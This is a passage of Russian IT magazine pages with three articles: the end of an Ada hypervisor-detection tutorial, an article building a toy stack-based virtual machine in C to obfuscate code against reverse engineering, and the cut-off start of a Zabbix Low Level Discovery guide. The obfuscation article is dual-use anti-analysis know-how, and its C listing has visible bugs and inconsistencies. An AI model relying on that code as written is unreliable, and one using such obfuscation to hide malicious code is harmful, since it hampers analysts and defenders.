В  hvinfo  этот  подход  использует ся  в  функциях  Hypervisor_Present
и Get_Vendor_String из hypervisor_check.adb.


ВЫЗОВ ФУНКЦИЙ ИЗ БИБЛИОТЕК НА C
Иногда самый простой способ определения гипервизора тре бует выпол‐
нения команд ОС. Например, в FreeBSD информа цию о Xen можно получить
через sysctl kern.vm_guest. Но для этого нам нужно научиться выполнять
внешние программы. Это можно было бы сделать встроенными средствами
через пакет POSIX, но для простоты и демонстрационной ценности мы
используем функцию system из libc.
   Ада предоставляет прос тые и развитые средства FFI и не тре бует libﬃ
для их работы. Можно импортировать функции из биб лиотек на C, C++ и For‐
tran, экспортировать функции из ады и соз давать биб лиоте ки для этих язы ков.
Мы рассмотрим самый простой вариант применения.
  Для взаимодействия с библиотеками на C исполь зуется пакет Interfaces.C.
Для преобразования символьных и строковых типов там опре делены функции
To_C и To_Ada. Например, эквивалент char* там называется Char_Array.
Поскольку ада не исполь зует нулевой байт как признак конца строки, переда‐
ча строк без преобразова ния может привести к самым неожиданным резуль‐
татам.
  Перед тем как импортировать функцию, нужно написать ее объявление.
Сам импорт функций производится с помощью директивы компилятора Im‐
port. Она принимает три аргумента: конвенцию вызовов, имя функции, каким
оно будет видно в аде, и имя функции из биб лиоте ки. В нашем слу чае
для импорта system() из libc потребу ется pragma Import  (C,  System,
"system");.
   Вот  пример  простейшей  программы,  которая  вызывает  uname  ‐a
и выводит код возврата, если он не равен нулю:


with Ada.Text_IO;
with Interfaces.C; use Interfaces.C;
procedure Call_Uname is
    function System (Arg : Char_Array) return Integer;
    pragma Import (C, System, "system");
    Retval : Integer;
begin
    Retval := System (To_C ("uname ‐a"));
    if Retval /= 0 then
        Ada.Text_IO.Put_Line ("Exit code:" & (Integer'Image (Retval
)));
    end if;
end Call_Uname;

В hvinfo этот подход используется в функциях VirtualBox_PCI_Present
и Xen_Present из hypervisor_check.adb.


ЧТЕНИЕ ФАЙЛОВ
В Linux очень много информации можно получить из sysfs, но для этого нам
нужно научиться читать файлы. Для демонстрации мы прочитаем наз вание
производителя машины из /sys/class/dmi/id/sys_vendor, если каталог
dmi/ существует. Многие гипервизоры помещают туда свое название,
и некоторые из них мож но определить только этим способом.
  Функции для работы с текстовыми файлами можно найти в пакете Ada.Tex‐
t_IO. Для сериализации и ввода‐вывода структурированных типов лучше
было бы использовать пакеты потоков ввода‐вывода Ada.Streams или Ada.
Sequential_IO, но для чтения из sysfs нам это не потребуется. Пос кольку
интересующие нас файлы всегда сос тоят из одной строки, нам даже
не понадобится искать конец файла, так что прос то запомним, что для этого
использовалась бы функция End_Of_File. В целом интерфейс Ada.Text_IO
привычен: открываем файл, получаем дескриптор, используем его как аргу‐
мент в функциях чтения и записи.
   Удобный пакет для работы с каталогами появился в Ada2005 и называется
Ada.Directories. Для про верки существования каталога с данными из DMI
мы используем функцию Ada.Directories.Exists.
   Вот наша программа:


with Ada.Strings.Unbounded;
with Ada.Text_IO;
with Ada.Text_IO.Unbounded_IO;
with Ada.Directories;
procedure DMI_Vendor is
    package IO renames Ada.Text_IO;
    package US renames Ada.Strings.Unbounded;
    package UIO renames Ada.Text_IO.Unbounded_IO;
    File : IO.File_Type;
    Vendor_Name : US.Unbounded_String;
begin
    if Ada.Directories.Exists ("/sys/class/dmi") then
        IO.Open (File => File, Name => "/sys/class/dmi/id/sys_vendor"
, Mode => IO.In_File);
        UIO.Get_Line (File, Vendor_Name);
        IO.Close (File);
        UIO.Put_Line (Vendor_Name);
    else
        IO.Put_Line ("DMI is not available");
    end if;
end DMI_Vendor;

В hvinfo этот подход используется для определения VirtualBox и Parallels
на Linux.


УСЛОВНАЯ КОМПИЛЯЦИЯ И МАКРОСЫ
Условная компиляция в аде использует ся редко. Компиляторы ады всегда
удаляют заведомо недостижимый код, но толь ко после проверки его пра‐
вильности, так что не нуж но тестировать сборку со всеми возможными ком‐
бинациями опций. Стандартный спо соб — определить константы для опций
сборки и просто писать что‐то вро де if My_Feature then ....
  Но есть и случаи, когда без условной компиляции не обойтись. Первый —
ассемблерные вставки, которые просто не компилируются на дру гих плат‐
формах. Второй — сами константы для опций сборки. Не зас тавлять же поль‐
зователя править файл с этими опциями вручную.
  В качестве препроцессора GNAT использует ся программа gnatprep. Син‐
таксис ее опций мало отличает ся от препроцессора C в GCC.
   Рассмотрим тривиальный случай: модуль с константой для версии прог‐
раммы, которая задается из командной строки:


package Config is
    Version : constant String := $VERSION;
end Config;

С помощью команды gnatprep ‐D VERSION=1.0 config.ads.in config.
ads можно заменить $VERSION на 1.0.
   Условная компиляция поддерживается самим компилятором, нужные
фрагменты заворачиваются в директиву #if <var> then ... #else ...
#end if, а переменные хра нятся в файле, который можно указать в опции
‐gnatep=<some file>.
  Например, пусть у нас есть такой код:


#if With_Cool_Feature then
Ada.Text_IO.Put_Line ("Cool feature enabled");
#else
Ada.Text_IO.Put_Line ("Cool feature disabled");
#end if

Чтобы собрать его с поддержкой With_Cool_Feature, нужно создать файл
(назовем его config.def) с содержанием With_Cool_Feature  :=  True
и выполнить команду gnatmake ‐gnatep=config.def myfile.adb.
  В hvinfo используются оба подхода. Для установки констант версии прог‐
раммы и целевой ОС применя ется gnatprep, скрипт mkconﬁg.def вызывает
его и генерирует модуль config.ads из файла config.ads.in. По крайней
мере техническую возможность сборки на отличных от x86 платформах обес‐
печивает условная компиляция, файл с определениями переменных для нее
генерирует скрипт mkdefs.sh. Пример использования можно увидеть в фун‐
кции CPUID из hypervisor_check.adb.


СБОРКА ПРОЕКТА
Поддержка ады в популярных средствах сборки проектов вроде CMake и au‐
totools рудиментарна либо отсутс твует вовсе. В слу чае с autotools это осо‐
бенно странно, поскольку они оба — проекты GNU и ада поддерживается
в GCC еще с начала девянос тых. К счастью, в GNAT есть собственный и весь‐
ма достойный высоко уровневый инс трумент сборки под названием gprbuild.
  Сценарии сборки хранятся в файлах с рас ширени ем .gpr, и их синтаксис
напоминает саму аду. Вот файл из hvinfo:


project hvinfo is
   for Languages use ("Ada");
   for Source_Dirs use ("src");
   for Object_Dir use  "build";
   for Main use ("hvinfo.adb");
   package Compiler is
      for Switches ("Ada") use
        ("‐gnatep=" & hvinfo'Project_Dir & "hvinfo.def", "‐I" &
hvinfo'Project_Dir);
   end Compiler;
end hvinfo;

С помощью опции Source_Dirs мы ука зываем каталог с исходным кодом (их
может быть несколько), а Object_Dir — это рабочий каталог для сборки,
куда помещаются временные файлы и скомпилированные программы и биб‐
лиотеки. Опция Main ука зывает основной файл про екта, где находится точка
входа.
  Запустить сборку можно командой gprbuild  ‐P<project  file>. Имя
файла проекта указывается без рас ширения. Например, в hvinfo этот файл
называется hvinfo.gpr, а команда для сбор ки будет gprbuild ‐Phvinfo.
  Нужно отме тить, что gprbuild управляет толь ко сбор кой, но не кон‐
фигурацией, аналог ./configure с его помощью не создать. Поскольку hvinfo
не имеет настраиваемых пользователем опций сборки, я ограничился теми
скриптами на Bourne shell, которые определяют ОС и архитектуру процессора
через uname и Makeﬁle. В силу прос тоты формата файлов для gnatprep и
‐gnatep написать свой скрипт нас тройки можно было бы на любом язы ке.
  Среда разработки GNAT Programming Studio для сборки проектов исполь‐
зует именно gprbuild.


ЗАКЛЮЧЕНИЕ
Несмотря на некото рые сложности, пос тавленная задача оказалась вполне
выпол нимой. Проект работа ет и достаточно прост в сборке и упаковке
в пакеты RPM/DEB.
  Поддержка некото рых ОС и гипер визоров все еще отсутс твует, часто
просто потому, что у меня их никогда нет под рукой. Исходный код рас‐
пространяется по лицензии GPL, и я всег да рад вашим патчам. Я надеюсь,
что hvinfo, помимо того что выполняет свою основную функцию, может также
послужить  всем  заин тересовавшимся  адой  дос тупным  для  изучения
и модификации проектом.
КОДИНГ
  ВИРТУАЛКА
   СВОИМИ
   РУКАМИ

       КАК ОБФУСЦИРОВАТЬ КОД
    ПРИ ПОМОЩИ ВИРТУАЛИЗАЦИИ
       И ЧТО ДЕЛАТЬ С ТАКОЙ
           ЗАЩИТОЙ





Есть множество решений для защиты прог‐
рамм, которые определяют работу внутри
изолированных сред, работают с антиотла‐
дочными приемами, контро лируют целос‐
тность своего кода и динамически шиф‐              Nik Zerof                                                                                              xtahi0nix@gmail.com
руют свои данные в памяти, защищаясь
от  дампа. Еще  одна мощная  техника
защиты — это виртуализация кода. В этой
статье я покажу, как она работа ет.


             INFO

                     Читай  другие  статьи  автора по теме  дебага
                      и защиты от него.
                      •Тайный  WinAPI.  Как обфусцировать вызовы
                         WinAPI в своем приложении
                    •Детект песочницы. Учимся определять, работа‐
                           ет ли приложение в sandbox‐изоляции
                    •Антиотладка. Теория и прак тика защиты при‐
                       ложений от дебага
                    •Набор  программ  для  взлома  прог рамм.
                      Выбираем инструмен ты для реверса


Здесь я имею в виду не виртуальные машины вроде VirtualBox или VMware,
а те, при помощи которых запутывают исполняемый код, чтобы затруднить
анализ программной логики. В этой статье мы кос немся принципов работы
виртуальных машин, компиляторов, трансляции кода, а также напишем свою
виртуальную машину, которая будет понимать наш собственный язык прог‐
раммирования.
   Итак, виртуальные машины, предназначенные для запутывания кода, осно‐
ваны на идее замены «обычного» байт‐кода, который, например, использует‐
ся в архитектуре x86‐64, на тот байт‐код, который мы изобретем сами. Чтобы
реконструировать поток управления в программе, подвергшейся виртуали‐
зации, необходимо проана лизировать каждый опкод и разобраться, что он
делает. Чтобы понимать, что происходит, нужно немного коснуться работы
процессора — ведь, по сути, перед нами сто ит задача «написать процессор».
  Нам предстоит написать некое подобие транслятора‐интерпретатора
кода — чтобы исходный код, который мы будем писать, начал обрабаты ваться
внутри нашей виртуальной машины. Можно про вести аналогию с процес‐
сорами: современные процессоры представляют собой сложные устройства,
которые управляются микрокодом. Многие наборы инструкций, особенно
современные, типа Advanced Vector Extensions (AVX), — это, по сути, подпрог‐
раммы на микрокоде процессора, который, в свою оче редь, напрямую вза‐
имодействует с железом про цес сора.
  Получается, что современные процессоры похожи больше на софт, а не
на  железо:  сложные  инс трукции  типа  VBROADCASTSS,  VINSERTF128,
VMASKMOVPS реализованы исключительно «софтверно» при помощи прог‐
рамм, состоящих из микрокодов. А таких наборов инструкций, как ты, воз‐
можно,  знаешь, много —  достаточно  открыть  техничес кое  описание
какого‐нибудь Skylake и пос мотреть на поддержи ваемые наборы инс трукций.


             INFO

                    Микропрограммы процессора состоят из мик‐
                      роинструкций, а они, в свою очередь, реализуют
                       элемен тарные операции процессора — операции,
                       которые уже нельзя разделить на более мелкие,
                       например  работа  с  арифметико‐логическим
                        устройством (АЛУ) процессора: подсоединение
                       регистров к входам АЛУ, обновление кодов сос‐
                       тояния  АЛУ,  настройка  АЛУ  на  выполнение
                      математических операций.



СТЕКОВАЯ ВИРТУАЛЬНАЯ МАШИНА
Нам необходимо будет эмулиро вать, помимо работы процессора, работу
памяти (RAM). Для это го мы вос пользуемся реализаци ей собственного сте ка,
который будет работать по принципу LIFO.


             INFO

                        LIFO (last in, ﬁrst out) — способ организа ции хра‐
                       нения данных, который похож на стоп ку журналов
                       на столе: если нужный журнал лежит в середине
                        стопки, нельзя его просто вытащить, можно толь‐
                        ко поочередно убирать журналы сверху и так
                      до  него  добраться.  Получается, мы  всегда
                       работаем только с верхушкой этой стопки.


В этом нет ничего сложного — по сути, это просто массив данных с указате‐
лем на них. Для наглядности код:


// Размер памяти VM
const int MAXMEM = 5;
// Массив памяти, который состоит из элементов типа int
int stack[MAXMEM];
// Указатель на положение данных в стеке, сейчас стек не
инициализирован
int sp = ‐1;

Этот стек станет оперативной памятью нашей виртуальной машины. Чтобы
путешествовать по нему, достаточно обычных операций с массивами:


stack[++sp] = data1;      // Положим данные
int data2 = stack[‐‐sp];  // Возьмем данные

Далее, чтобы наша память не «сло малась», нам необходимо позаботиться
о проверках, чтобы не срабатывали попытки взять данные, когда память пус‐
та, либо положить больше данных, чем она может вместить.


// Проверка стека на пустоту
// Функция вернет TRUE (1), если стек пуст,
// и FALSE (0), если данные есть
int empty_sp() {
  return sp == ‐1 ? 1 : 0;
}
// Проверка стека на заполненность
// Функция вернет TRUE (1), если стек полон,
// и FALSE (0), если место еще есть
int full_sp() {
  return sp == MAXMEM ? 1 : 0;
}

Как видишь, никакой магии нет! Мы успешно запрограммировали память
для нашей будущей VM. Далее переходим к командам. Создадим перечис‐
ление под названием mnemonics и запол ним его инструкциями для нашей VM
(читай комментарии):


// Поддерживаемые мнемоники VM
typedef enum {
  // Положить значение на стек. Этот параметр имеет один аргумент
  PUSH  = 0x00d00201,
  // Получить значение со стека. Берется верхушка стека
  POP = 0x00d00205,
  // Сложить два верхних значения стека
  ADD = 0x00d00202,
  // Вычесть два верхних значения стека
  SUB = 0x00d00206,
  // Поделить два значения
  DIV = 0x00d00203,
  // Перемножить два значения. Во всех четырех операциях результат
кладется на стек
  MUL = 0x00d00204,
  // Ввести данные
  ENTER = 0x00d00211,
  // Сверка данных с шаблоном
  TEST  = 0x00d00209,
  // Вывести верхушку стека
  PRINT = 0x00d00210,
  // Вывести все данные, которые находятся в нашей памяти
  RAM = 0x00d00208,
  // Завершить работу виртуальной машины
  EXIT  = 0x00d00207
} mnemonics;

У каждой мнемоники есть зна чение в шестнадцатеричном формате, которое
мы присвоили самостоятельно. Если бы мы не сделали этого, в перечислении
все элементы были бы про нумерованы начиная с нуля с шагом в единицу.
Зачем мы так поступили, я объясню поз же, а мы теперь готовы написать прог‐
рамму, которая состоит из наших инструкций, я также ее прокомментирую.


// Исполняемый код
const int code[] = {
  PUSH, 22,   // Кладем на стек 22
  PUSH, 45,   // Кладем на стек 45
  RAM,        // Выводим содержимое памяти
  SUB,        // Вычитание
  POP,        // Вытащить результат из стека
  PUSH, 23,   // Кладем на стек 23
  PUSH, 9,    // Кладем на стек 9
  PUSH, 5,    // Проверка на ошибку
  RAM,        // Выводим содержимое памяти
  PRINT,      // Выводим верхушку стека
  ADD,        // Сложение
  POP,        // Вытащить результат
  PUSH, 7,    // Кладем на стек 7
  PUSH, 7,    // Кладем на стек 7
  RAM,        // Выводим содержимое памяти
  ADD,        // Сложение
  POP,        // Вытащить результат
  POP,        // Проверка на ошибку
  ENTER,      // Ввод данных
  PRINT,      // Выводим верхушку стека
  TEST,       // Проверяем данные
  EXIT        // Остановка VM
};

Как видишь, это такой же прос той мас сив. Единственное, что может немного
смутить, — манера записи, но это лишь для нагляднос ти.
  Кроме того, нам понадобится еще одна переменная, чтобы перемещаться
по коду в случае необ ходимости.


int ip = 0; // Указатель на инструкцию (мнемонику)

Теперь мы подошли к самому интересному — основному циклу виртуальной
машины. Именно этот цикл оживит наши инструкции и придаст им смысл. Я
приведу полный листинг с комментариями.


// Трансляция кода VM
void decoder(int instr) {
  switch (instr) {
  case PUSH: {
    // Проверяем, есть ли место в памяти
    if (full_sp()) {
      printf("Memory is full\n");
      break;
    }
    // Перемещаемся в свободную ячейку памяти
    sp++;
    // В массиве кода берем следующее за мнемоникой PUSH значение
    // и кладем его в ячейку памяти
    stack[sp] = code[++ip];
    break;
  }
  case POP: {
    // Проверка памяти на пустоту
    if (empty_sp()) {
      printf("Memory is empty\n");
      break;
    }
    // Берем значение с верхушки стека
    int pop_value = stack[sp‐‐];
    // и выводим его
    printf("Result: %d \n", pop_value);
    break;
  }
  case ADD: {
    // Берем два верхних значения стека
    int a = stack[sp‐‐];
    int b = stack[sp‐‐];
    sp++;
    // Складываем их и кладем результат на стек
    stack[sp] = b + a;
    // Выводим сообщение
    printf("ADD‐>");
    break;
  }
  case SUB: {
    // Берем два верхних значения стека
    int a = stack[sp‐‐];
    int b = stack[sp‐‐];
    sp++;
    // Вычитаем их и кладем результат на стек
    stack[sp] = a ‐ b;
    // Выводим сообщение
    printf("SUB‐>");
    break;
  }
  case DIV: {
    // Берем два верхних значения стека
    int a = stack[sp‐‐];
    int b = stack[sp‐‐];
    sp++;
    // Делим их и кладем результат на стек
    stack[sp] = a / b;
    // Выводим сообщение
    printf("DIV‐>");
    break;
  }
  case MUL: {
    // Берем два верхних значения стека
    int a = stack[sp‐‐];
    int b = stack[sp‐‐];
    sp++;
    // Перемножаем их и кладем результат на стек
    stack[sp] = a * b;
    // Выводим сообщение
    printf("DIV‐>");
    break;
  }
  case RAM: {
    // Это простой цикл вывода всех значений массива
    int x = sp;
    for (; x >= 0; ‐‐x) {
      printf("RAM[%u]: %u\n", x, stack[x]);
    }
    break;
}
  case TEST: {
    // Сверка верхнего значения стека с числом 0x31337
    // Если числа совпадают, выводится сообщение «Good Pass!»,
    // иначе «Bad Pass!»
    stack[sp‐‐] == 0x31337 ? printf("Good Pass!\n") : printf("Bad
Pass!\n");
    break;
  }
  case PRINT: {
    printf("PRINT Stack[%u]: %u\n", sp, stack[sp]);
    break;
  }
  case ENTER: {
    printf("ENTER Password: ");
    // Перемещаемся вверх по памяти
    // и при помощи scanf_s записываем данные в наш массив
    // Введенные данные окажутся на верхушке массива
    sp++;
    scanf_s("%i", &stack[sp]);
    break;
  }
  case EXIT: {
    // Установка глобальной переменной в FALSE,
    // чтобы прервать работу VM
    VM = false;
    printf("Exit VM\n");
    break;
  }
  }
}

Разумеется, это не самый ста бильный код в мире, и можно добавить
еще разные проверки для повышения стабильнос ти, но я попытался найти
золотую середину между сложностью кода и лег костью его вос приятия.
   Итак, мы реализова ли команды вир туальной машины. Давай теперь ее
запустим!


int main() {
  while (VM) { // Переменная, которая контролирует работу VM
    decoder(code[ip]);
    ip++;
  }
  system("pause");
}

Надо сказать, что я установил зна чение переменной MAXMEM равным единице,
чтобы память VM вмещала только два значения. Нам все равно больше
не нужно, но это полез но для демонстра ции работы функций, которые кон‐
тролируют перепол нение или опустошение памяти. Вот скриншот работы
виртуальной машины.





                           Работа VM

Вроде бы все работает как надо. Теперь давай посмотрим, как распутывать
код, который спрятан внутри подобной вир туал ки.
  На самом деле все очень просто: нужно заг рузить этот файл в дизассем‐
блер, найти наш цикл switch/case и посмотреть на места, где происходит
сравнение с нашими константами‐инструкциями. Заглянув в каждое ветвле‐
ние после сравнения с константой, можно определить, за что отвечает эта
константа‐инструкция.
  В итоге можно написать автоматический скрипт, прогон которого будет
раскладывать весь наш байт‐код и давать верные имена подпрограммам,
которые представляют инс трукции виртуальной машины. Получается, пот‐
ратив некоторое время на ана лиз вир туальной машины, можно потом
написать универ сальный скрипт, который будет «снимать» эту VM с любой
программы. Мы ведь будем знать все значения констант‐инструкций! Но это
не совсем так...
  Помнишь перечисление mnemonics, в котором мы прис ваивали значения
нашим командам? Я обещал еще вернуться к нему. Его можно записать нем‐
ного по‐другому:


static unsigned long time = (unsigned int)__TIMESTAMP__;
#define time x
typedef enum {
  // Положить значение на стек. Этот параметр имеет один аргумент
  PUSH  = 0x00d00201 ^ x,
  // Получить значение со стека. Берется верхушка стека
  POP = 0x00d00205 ^ x,
  // Сложить два верхних значения стека
  ADD = 0x00d00202 ^ x,
  // Вычесть два верхних значения стека
  SUB = 0x00d00206 ^ x,
  // Поделить два значения
  DIV = 0x00d00203 ^ x,
  // Перемножить два значения. Во всех четырех операциях результат
кладется на стек
  MUL = 0x00d00204 ^ x,
  // Ввести данные
  ENTER = 0x00d00211 ^ x,
  // Сверка данных с шаблоном
  TEST  = 0x00d00209 ^ x,
  // Вывести верхушку стека
  PRINT = 0x00d00210 ^ x,
  // Вывести все данные, которые находятся в нашей памяти
  RAM = 0x00d00208 ^ x,
  // Завершить работу виртуальной машины
  EXIT  = 0x00d00207 ^ x,
} mnemonics;

Ничего необычного, прос то операция xor (побитовое исключающее ИЛИ)
применяется к каждому зна чению кодов наших мнемоник. Но обрати вни‐
мание на то, как инициализируется эта переменная.


static unsigned long time = (unsigned int)__TIMESTAMP__;

Мы используем предопределенную константу __TIMESTAMP__, при водим ее
в число и берем его для xor. Эта константа берет время компиляции, поэтому
для каждой скомпилиро ванной программы зна чения операций будут отли‐
чаться. При таком раскладе становится слож нее написать универсальный
скрипт, разбирающий VM в автоматичес ком режиме.


ЗАКЛЮЧЕНИЕ
В этой статье мы рассмотрели, как можно сделать собс твенную виртуал ку,
которая будет исполнять наш исходный код. Конечно, в серьезных ком‐
мерческих виртуальных машинах, которые исполь зуются в протекторах, все
намного сложнее, но это первое приб лижение — демонс трация того, с чем
придется сталкиваться, ког да нужно будет дизассемблировать подобные
защитные механизмы.
АДМИН





    НИЗКОУРОВНЕВОЕ
  ОБНАРУЖЕНИЕ

     КАК ИСПОЛЬЗОВАТЬ ZABBIX LLD,
      ЧТОБЫ АВТОМАТИЗИРОВАТЬ
           МОНИТОРИНГ





Сегодня я рас скажу о важной части сис‐
темы мониторинга  Zabbix — низкоуров‐
невом обнаружении, или Low Level Discov‐
ery. Статья познакомит тебя с базовыми
сведениями об этой интересной функции         Иван Рыжевцев                                                                              Системный администратор с
и поможет автоматизировать твою систему          ryzhevtsev@gmail.comбогатым опытом
мониторинга и вывести ее на новый уро‐
вень.


Идея такой статьи родилась у меня, когда я вспомнил забавный эпизод
из практики — впрочем, не то что бы из ряда вон выходя щий. Но прежде чем я
им поделюсь, давай условимся, что ты уже развернул систему мониторинга
Zabbix и подклю чил все необходимые хос ты.
   Не  секрет,  что  пра виль но  нас троенный  мониторинг  в  99  случаях
из 100 позволяет избежать круп ной аварии в информационной сис теме. Ава‐
рия может быть любого типа: от прос тых пятисо тых ошибок на фронтенде
до ужасающих  отставаний репликации на серверах баз данных и до
еще более ужасного выхода железа из строя. Во всех этих случаях нас спа‐
сает система монито ринга. Как показы вает практика, грамотно нас троенный
мониторинг творит чудеса, бережет нервы и греет душу.
   На начальном этапе развития системы все прос то. Есть от двух до десяти
серверов, и все настрой ки можно проставить вручную. А как быть, когда сис‐
тема постепенно, но неумолимо рас тет? Когда серверов уже не десять,
а пятьдесят или сто? Справиться как раз и помогает механизм Low Level
Discovery.
   Низкоуровневое обнаружение  (я буду сокращать до LLD) дает воз‐
можность автоматизировать создание метрик (элементов данных), хостов,
триггеров и графиков для разных объектов в системе мониторинга. Как при‐
мер можно привести мониторинг файловых систем и разделов в Linux — низ‐
коуровневое обнаружение уже идет в пос тавке Zabbix для этой ОС. Делать тут
ничего не надо, достаточно завести нуж ные хосты в группу, и все.
  Мониторинг сетевых интерфейсов в Zabbix — это тоже низкоуровневые
обнаружения. Кстати, мож но нас троить авто матичес кое удаление объ ектов
из мониторинга по результатам про водимых обна руже ний. И администратор
может определить собственные типы обна ружения — достаточно описать их
в виде файла JSON.
   Но вернемся к обещанной истории из практики. Работал со мной один
коллега, начинающий администра тор. Ему дали задачу: завести под монито‐
ринг около 270 объектов в Zabbix и настроить по ним триггеры. Казалось бы,
все просто. В тот же день спрашиваю его: «Ну как, успел завести, сколько
осталось? Готовы ли триггеры?» В ответ слышу: «Сегод ня заведу метрики!
А завтра сделаю триггеры!»
   Задачу при этом нужно было закрыть в  тот же день и отчитаться
перед начальством. Как ока залось, коллега делал эти объекты вручную
по одному. Сказать, что я опешил, — ничего не сказать. Спросил его про LLD,
и выяснилось, что он даже не знал о существовании такой вещи. После
небольшого экскурса мы закрыли задачу за час вмес то двух дней ручной
работы.
   А теперь я повторю этот экскурс для читателей «Хакера».


НИЗКОУРОВНЕВЫЕ ОБНАРУЖЕНИЯ В ТЕОРИИ
LLD появилась в Zabbix где‐то с версии 2.0. Эта техника применяется не толь‐
ко для автообнаружения на хос тах, LLD еще очень хорошо разгру жает работу
сервера Zabbix. В случае активной проверки сервер Zabbix сам отправляет
запрос на хост, чтобы получить метрику. Обычно запрос ставится в очередь
наряду со всеми остальными запросами и обрабаты вается в порядке оче‐
реди, но, если метрик мно го, сервер будет серь езно загружен. В случае с LLD
в режиме проверки хост zabbix‐trapper сам отправляет серверу список мет‐
рик, а спустя небольшое время — и сами метрики со значениями. То есть
нагрузка выходит минимальная. Сервер сам реша ет, что при нимать, а что нет,
исходя из настроек.
   Реализация технологии LLD на хосте следующая: используется связка
«приложение — скрипт — сендер Zabbix — сервер Zabbix». Давай пройдемся
по всем этапам, чтобы было понятнее.
 1. Инициализация скрипта.
 2. Запрос от скрипта к приложению на получение мет рик.
 3. Обработка запроса от скрипта приложением.
 4. Ответ скрипту от приложения с переда чей данных.
 5. Формирование скриптом JSON LLD для переда чи имен метрик на сервер
    Zabbix.
 6. Выдача JSON при вызове скрипта.
 7. Обработка полученных от приложения данных путем формирования мет‐
   рик и их значений (к примеру, с записью в файл).
 8. Вызов сендера Zabbix скриптом и ини циализация отправки метрик на сер‐
   вер.
 9. Сендер передает запрос на сервер Zabbix. Режим проверки на сервере
    zabbix‐trapper.
10. Сервер Zabbix считывает метрики и отправляет ответ для сендера.
11. Сендер получает ответ от сервера и логиру ет его на экран или в файл.

Чтобы было наглядней, я подготовил для тебя неболь шую графическую схему
взаимодействия компонентов. Надеюсь, она тебе поможет.





            Схема вза имо действия компонентов Zabbix LLD

В остальных вопросах ты можешь смело обра щаться к документации Zabbix.
Русскоязычная документация лежит в открытом доступе.


             INFO

                        Чтобы ясно понимать прин ципы работы и взаимо‐
                      действия компонен тов в системе, всегда рисуй
                        схему. Это поможет тебе увидеть полную картину
                      работы системы и освежит память в случае, если
                       ты давно не притрагивался к компонентам сис‐
                       темы.



КАК ЭТО ВЫГЛЯДИТ НА ПРАКТИКЕ
Что можно монито рить с помощью LLD? Да все что угодно! Главное — чтобы
на хосте было боль шое количес тво объектов. Также желательно, чтобы объ‐
екты имели струк туру. Хороший пример — мониторинг количес тва сообщений
в очередях на сервере RabbitMQ. Общее количес тво очередей на сервере
может быть больше ста штук. А из структуры объектов нам понадобятся толь‐
ко имя очереди на сервере и количес тво сооб щений за пос леднюю минуту.
   Итак, ставим себе задачу.
 1. Собирать количество сообщений в очереди AMQP на сервере.
 2. В том случае, если в очереди скопилось больше пяти сообщений за пять
   минут, вывести триггер предупреждения. Если свы ше 100 за 30 минут, то
   триггер повышается до статуса чрез вычайного.


             INFO

                   В этом примере сервер и хост Zabbix развернуты
                       на системе Linux CentOS 7.2. Версия хоста и сер‐
                       вера — 3.4. Ты можешь использовать любой дру‐
                        гой дистрибутив операционной системы на свое
                       усмотрение.  Версию  Zabbix  советую  исполь‐
                         зовать выше 2.0.


Переходим к настрой ке LLD на сервере Zabbix. Необ ходимо будет настроить
шаблон, а внутри него — обнаружение. Все прос то.
   Настраиваем шаблон AMQP: «Нас тройка → Шаблоны → Создать шаб‐
лон». Заполняем поля «Имя шаблона» и «Видимое имя» (к примеру, Template
App AMQP). Переходим в только что созданный шаблон. Создаем группу эле‐
ментов данных, назовем ее AMQP service. Добавим нужные хос ты или группы
хостов в шаблон.





                    Нас трой ка шаблона Zabbix

Создаем правила обнаружения для метрик: «Нас тройка → Шаблоны → Имя
созданного шаблона → Пра вила обна ружения → Соз дать правило обнаруже‐
ния».


Имя: amqp.discovery
Тип: Zabbix‐агент
Ключ: amqp.discovery
Интервал обновления (в секундах): 60
Период сохранения потерянных ресурсов (дней): 30





               Создание правила обнаружения Zabbix

Создаем прототип данных (прототип мет рики): «Настройка → Шаблоны →
Имя созданного шаблона → Пра вила обна ружения → Имя созданного пра‐
вила → Прототипы элемен тов данных → Создать прототип элементов дан‐
ных».


Имя: очередь {#QUEUENAME}
Тип: Zabbix‐траппер
Ключ: amqp.queue.count[{#QUEUENAME}]
Тип информации: числовой (целое положительное)
Тип данных: десятичный
Период хранения истории (в днях): 30
Период хранения динамики изменений (в днях): 90
Хранение значения: как есть
Отображение значения: как есть
Группы элементов данных: AMQP service





                 Создание прототи па данных Zabbix

Создаем прототип графика для мет рик. «Нас трой ка → Шаблоны → Имя соз‐
данного шаблона → Пра вила обна ружения → Имя соз данного правила →
Прототипы графиков → Создать прототип графика». Все как при создании
обычного графика для хос та, только вместо элемента данных выбираем про‐
тотип данных. Теперь по каж дой метрике будет создаваться отдельный гра‐
фик.





                Создание прототи па гра фика Zabbix

Создаем прототипы триггеров по про тотипам данных. «Настройка → Шаб‐
лоны → Имя созданного шаблона → Правила обнаружения → Имя созданно‐
го правила → Прототипы триггеров → Создать прототип триггеров». Все
как обычно при создании триггера, толь ко выбира ем прототип элемента дан‐
ных. Пример можешь пос мотреть на скрин шоте.





                Создание прототи па триггера Zabbix

Далее идет настройка хоста для отправки метрик на сервер. Устанавливаем
на хосте пакет zabbix‐sender для отправки данных с хоста на сервер Zabbix.


$ sudo yum install ‐y zabbix‐sender

Проверить разрешение у юзера zabbix на использование командной стро‐
ки — в нашем случае RabbitMQ, то есть /usr/sbin/rabbitmqctl. Если раз‐
решения нет, то обязатель но добавить в SUDO.


  [DEV][iaryzhe3@mpt‐mq1 ~]$ sudo cat /etc/sudoers.d/zabbix


   Cmnd_Alias ZABBIX_GROUP_CMD = /sbin/service zabbix‐agent
   %zabbix ALL = NOPASSWD: ZABBIX_GROUP_CMD
   Cmnd_Alias ZABBIX_CMD = /usr/sbin/rabbitmqctl
   zabbix ALL = NOPASSWD: ZABBIX_CMD
   Defaults:zabbix !requiretty

  [DEV][iaryzhe3@mpt‐mq1 ~]$


Теперь пишем примитивный скрипт мониторинга очередей на хосте zabbix.
Скрипты для получения мет рик идут /etc/zabbix/scripts/. Логика работы
будет следующая.
 1. Задаем переменные имени хоста (который отправляет метрики), имя сер‐
   вера (который принимает метрики), номер порта (который будет слу шать
   сервер).
 2. Чистим системные файлы скрипта, чтобы не перепол няли место на раз‐
   деле.
 3. Запрашиваем список виртуальных хос тов на сервере очередей и пишем
   их в файл /etc/zabbix/scripts/zamqp_vhosts.list.
 4. Проходим  весь  файл  /etc/zabbix/scripts/zamqp_vhosts.list
   и запрашиваем список очередей по вир туальным хостам. Зашиваем име‐
   на  очередей  и  их  значения  в  файл  /etc/zabbix/scripts/za
   mqp_queues.list.
 5. Начинаем формирова ние JSON для передачи всех значений имен оче‐
   редей с хоста.
 6. Проходим файл /etc/zabbix/scripts/zamqp_queues.list, при этом
